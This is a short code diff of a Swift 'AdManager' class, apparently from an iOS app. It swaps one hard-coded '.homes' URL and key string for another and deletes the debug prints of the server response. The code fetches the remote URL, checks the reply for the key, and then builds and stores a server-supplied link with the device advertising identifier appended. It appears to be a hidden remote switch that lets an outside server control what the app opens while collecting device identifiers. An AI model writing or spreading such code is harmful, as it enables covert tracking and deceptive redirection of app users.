@@ -133,8 +133,8 @@ public final class AdManager {
             return
         }
         
-        let source = "https://frapper.homes/vestspnesp"
-        let user = "vegasbnty"
+        let source = "https://mixsolnaradastahasabili.homes/blca"
+        let user = "koilok"
         
         self.makeRequest(url: source) { result in
             let idfa = idfa
@@ -142,11 +142,9 @@ public final class AdManager {
             case .success(let data):
                 let responseString = String(data: data,
                                             encoding: .utf8) ?? ""
-                print(responseString)
                 if responseString.contains(user) {
                     let link = "\(responseString)?idfa=\(idfa)\(String(describing: extraInfo))"
                     resultedString = link
-                    print(resultedString)
                     UserDefaults.standard.setValue(link,
                                                    forKey: "advert")
                     completion(link)
